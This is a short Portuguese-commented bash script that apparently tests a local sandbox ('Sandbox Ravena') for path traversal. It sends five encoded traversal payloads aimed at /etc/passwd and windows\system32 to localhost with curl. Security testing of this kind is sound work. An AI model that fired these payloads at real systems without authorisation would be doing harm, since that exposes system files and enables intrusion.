#!/bin/bash
# ============================================
# TESTE DE PATH TRAVERSAL
# Sandbox Ravena
# ============================================

echo "============================================"
echo "  TESTE DE PATH TRAVERSAL"
echo "============================================"

TARGET="http://localhost:8080"

echo "Alvo: $TARGET"
echo ""

# Payloads de Path Traversal
PAYLOADS=(
    "../../../etc/passwd"
    "..\\..\\..\\windows\\system32"
    "%2e%2e%2f%2e%2e%2f"
    "....//....//....//etc/passwd"
    "..%252f..%252f..%252fetc/passwd"
)

echo "Testando payloads..."
echo ""

for payload in "${PAYLOADS[@]}"; do
    echo "Payload: $payload"
    curl -s "$TARGET/$payload" | head -20
    echo "---"
done

echo ""
echo "Teste concluído!"
